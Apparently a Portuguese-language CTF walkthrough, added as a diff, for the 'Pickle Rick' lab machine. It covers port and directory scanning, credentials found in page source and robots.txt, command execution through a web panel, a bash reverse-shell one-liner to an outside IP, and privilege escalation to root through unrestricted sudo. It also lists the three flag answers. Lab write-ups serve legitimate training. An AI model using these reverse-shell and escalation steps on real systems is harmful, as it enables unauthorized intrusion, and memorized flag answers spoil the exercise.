@@ -1,0 +1,75 @@
+ Enumeraçao de PORTAS
+
+Scanning 10.10.28.112 [1000 ports]
+Discovered open port 22/tcp on 10.10.28.112
+Discovered open port 80/tcp on 10.10.28.112
+
+Inicialmente temos um site: http://10.10.28.112/
+apos ver o codigo fonte, achamos a primeira pista:
+ 
+ Note to self, remember username!
+
+    Username: R1ckRul3s
+
+
+first scan dirb                       
+
+---- Scanning URL: http://10.10.28.112/ ----
+==> DIRECTORY: http://10.10.28.112/assets/                                                                                                   
++ http://10.10.28.112/index.html (CODE:200|SIZE:1062)                                                                                        
++ http://10.10.28.112/robots.txt (CODE:200|SIZE:17)                                                                                          
++ http://10.10.28.112/server-status (CODE:403|SIZE:300) 
+http://10.10.28.112   webserver
+http://10.10.28.112/assets/ diretorios open
+
+
+
+scan com nikto wins
+http://10.10.28.112/login.php
+robots.txt
+Wubbalubbadubdub
+
+Dentro da pagina identificamos um command line
+apos alguns testes..
+
+less habilitado,
+/usr/bin/less Sup3rS3cretPickl3Ingred.txt
+mr. meeseek hair
+/usr/bin/less /home/rick/second\ ingredients
+1 jerry tear
+
+
+
+
+
+Em um reverse shell
+/bin/bash -c 'bash -i >& /dev/tcp/10.9.237.206/321 0>&1'
+-c para comando shell e temos o primeiro acesso
+www-data@ip-10-10-252-220:/snap$ uname -a
+uname -a
+Linux ip-10-10-252-220 4.4.0-1072-aws #82-Ubuntu SMP Fri Nov 2 15:00:21 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux
+
+find / -perm -u=s -type f 2>/dev/null
+.
+.
+.
+www-data@ip-10-10-118-111:/var/www/html$ sudo -l
+sudo -l
+Matching Defaults entries for www-data on
+    ip-10-10-118-111.eu-west-1.compute.internal:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User www-data may run the following commands on
+        ip-10-10-118-111.eu-west-1.compute.internal:
+    (ALL) NOPASSWD: ALL
+www-data@ip-10-10-118-111:/var/www/html$ sudo su
+sudo su
+script -qc /bin/bash
+root@ip-10-10-118-111:/var/www/html# id
+id
+uid=0(root) gid=0(root) groups=0(root)
+root@ip-10-10-118-111:/var/www/html# 
+
+cat 3rd.txt
+fleeb juice
